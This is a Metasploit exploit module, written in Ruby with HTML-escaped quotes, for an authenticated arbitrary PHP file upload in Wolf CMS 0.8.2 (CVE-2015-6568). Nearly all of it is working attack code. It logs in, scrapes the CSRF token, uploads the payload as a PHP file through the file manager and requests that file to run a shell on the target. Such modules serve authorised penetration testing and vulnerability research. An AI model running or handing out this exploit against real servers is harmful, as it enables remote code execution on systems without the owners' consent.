# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
 
    def initialize
    super(
      &#039;Name&#039;           => &#039;Wolfcms 0.8.2 Arbitrary PHP File Upload Vulnerability&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a file upload vulnerability in Wolfcms
        version 0.8.2. This application has an upload feature that 
        allows an authenticated user with administrator roles to upload 
        arbitrary files to the &#039;/public&#039; directory.
      },
      &#039;Author&#039;         => [
        &#039;Narendra Bhati&#039;, # Proof of concept
        &#039;Rahmat Nurfauzi&#039; # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2015-6568&#039;], 
          [&#039;CVE&#039;, &#039;2015-6567&#039;],
          [&#039;OSVDB&#039;,&#039;126852&#039;],          
          [&#039;EDB&#039;, &#039;38000&#039;],
        ],
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [&#039;Wolfcms <= 0.8.2&#039;, {}]
        ],
      &#039;DisclosureDate&#039; => &#039;Aug 28 2015&#039;,
      &#039;Privileged&#039;     => false,      
      &#039;DefaultTarget&#039; => 0
    )
 
    register_options(
        [
          OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path to wolfcms&#039;, &#039;/wolfcms&#039;]),
          OptString.new(&#039;USER&#039;, [true, &#039;User to login with&#039;, &#039;&#039;]),
          OptString.new(&#039;PASS&#039;, [true, &#039;Password to login with&#039;, &#039;&#039;]),
        ], self.class)
    end
   
  def login
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri, "/?/admin/login/login/"),
      &#039;vars_post&#039; => {
          "login[username]" => datastore[&#039;USER&#039;],
          "login[password]" => datastore[&#039;PASS&#039;],
          "login[redirect]" => "/wolfcms/?/admin"
      }
    })
    return res
  end
 
  def exploit
 
    upload_name = rand_text_alpha(5 + rand(5)) + &#039;.php&#039;
 
    get_cookie = login.get_cookies
    cookie = get_cookie.split(";")[3]
 
    token = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;cookie&#039; => cookie,
      &#039;uri&#039;    => normalize_uri(target_uri, "/?/admin/plugin/file_manager/browse/")     
    })
 
    html = token.body
    if html =~ /Files/
      print_status("Login successfuly")
    end
    csrf_token = html.scan(/<input\s*id=\"csrf_token\"\s*name=\"csrf_token\"\s*type=\"hidden\"\s*value=\"(.*)"/).last.first
 
    boundary = Rex::Text.rand_text_hex(28)
 
    data = "-----------------------------#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"csrf_token\"\r\n"
    data << "\r\n"
    data << csrf_token
    data << "\r\n"
    data << "-----------------------------#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"upload[path]\"\r\n\r\n"
    data << "/"
    data << "\r\n"
    data << "-----------------------------#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"upload_file\"; filename=\"#{upload_name}\"\r\n"
    data << "Content-Type: text/x-php\r\n"
    data << "\r\n"
    data << payload.encoded
    data << "\r\n"
    data << "-----------------------------#{boundary}\r\n"
    data << "Content-Disposition: form-data; name=\"commit\"\r\n"
    data << "\r\n"
    data << "Upload\r\n"
    data << "-----------------------------#{boundary}--\r\n\r\n"
 
    print_good("#{peer} - Payload uploaded as #{upload_name}")
 
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,    
      &#039;data&#039;  => data,
      &#039;headers&#039; =>
      {
        &#039;Content-Type&#039;   => &#039;multipart/form-data; boundary=---------------------------&#039; + boundary,
        &#039;Cookie&#039;   => cookie,
      },
      &#039;uri&#039; => normalize_uri(target_uri, "/?/admin/plugin/file_manager/upload/")     
    })
     
    register_file_for_cleanup(upload_name)
 
    print_status("#{peer} - Executing shell...")
 
    send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => normalize_uri(target_uri.path, "public",upload_name),
    })
    
  end   
end

